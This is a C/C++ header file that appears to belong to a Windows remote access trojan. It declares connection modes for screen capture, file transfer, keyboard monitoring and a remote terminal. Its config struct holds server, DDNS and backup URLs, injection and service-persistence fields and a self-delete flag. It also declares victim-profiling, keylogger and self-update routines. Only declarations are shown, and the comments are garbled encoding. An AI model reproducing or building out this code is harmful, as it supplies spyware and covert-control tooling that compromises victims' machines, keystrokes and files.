#include <Wininet.h>
#include <process.h>
#include <stdlib.h>
#include <stdio.h>

#define CONN_MAIN				3000				//��������
#define CONN_FILE_MAIN			3001				//��Ҫ����
#define CONN_FRAM				3003				//��Ļ����
#define CONN_FILE_UP			3004				//�ϴ��ļ�
#define CONN_FILE_DL			3005				//�����ļ�
#define CONN_KEY				3006				//���̼��
#define CONN_TLNT				3007				//�����ն�
#define CONN_FILE_BACK			3008				//��̨����

typedef struct _INITDLLINFO_
{
	WORD m_ServerPort;
	UINT m_ProcessId;
	UINT m_DllFileLen;
	char m_ProcessName[128];
	char m_KeyName[24];
	char m_CtrlFile[128];
	char m_StartFile[128];
	char m_ServerAddr[128];
	char m_ParentFile[256];
	char m_EventName[32];
	char m_DdnsUrl[128];
	char m_BakUrl[128];
	char m_IsUpdate;
	char m_ext[511];
	char  m_nowExefile[256];
	char  m_serviceName[100];
	char  m_serviceDisplayname[100];
	char  m_serviceMark[100];
	bool  m_bDelete;
}INITDLLINFO,*LPINITDLLINFO;

typedef struct _LOGININFO_
{
	UINT m_CpuSpeed;			//CPU��Ƶ
	UINT m_MemContent;			//�ڴ�����
	char ID[17];				//Ψһ��ʶ
	char m_PcName[64];			//���������
	char m_SysType;				//����ϵͳ����
	char m_CpuCount;			//CPU����
	char m_UserName[38];		//�û�����
}LOGININFO,*LPLOGININFO;

typedef enum tagWin32SysType{
   Windows32s,
   WindowsNT3,
   Windows95,
   Windows98,
   WindowsME,
   WindowsNT4,
   Windows2000,
   WindowsXP,
   Windows2003
}Type;

Type IsShellSysType();

//�ӿں���
typedef void (* PROCESSTRANS)(HINTERNET , HANDLE , char* , int , char* , char*);

#ifdef _DEBUG
void WriteLog(char* pText);
#endif

BOOL KeyStartMyWork();
void KeyStopMyWork();
	
class SshWork 
{
public:
	BOOL UpdateExeFile();
	SshWork();
	~SshWork();

	INITDLLINFO m_InitInfo;

	HMODULE		hCtrlMd;
	HMODULE		m_Module;
	HANDLE		m_ExitEvent;
	HANDLE		m_Thread;
	HINTERNET	hIe;
	HINTERNET	hFp;
	char		m_IsVideo;

	BOOL GetDesServerInfo(LPINITDLLINFO pInfo, char* pUrl);
	BOOL GetHttpConnect(LPINITDLLINFO pInfo);
	BOOL RecvData(HINTERNET hFile,LPVOID pData,int DataLen);
	void GetMySysInfo(char* pData);

	BOOL DlFile(char* pFileName);

	void BcdToAsc(BYTE *BcdStr , BYTE *AscStr , int BcdStrLen);
	DWORD getCpuSpeedFromRegistry(void);
	char GetVideoInfo();
	void StopWork();
	void StartWork(LPINITDLLINFO pItem);
	void CloseHttpHandle();

	UINT static WINAPI  SSH_WorkThread(LPVOID lPvoid);
};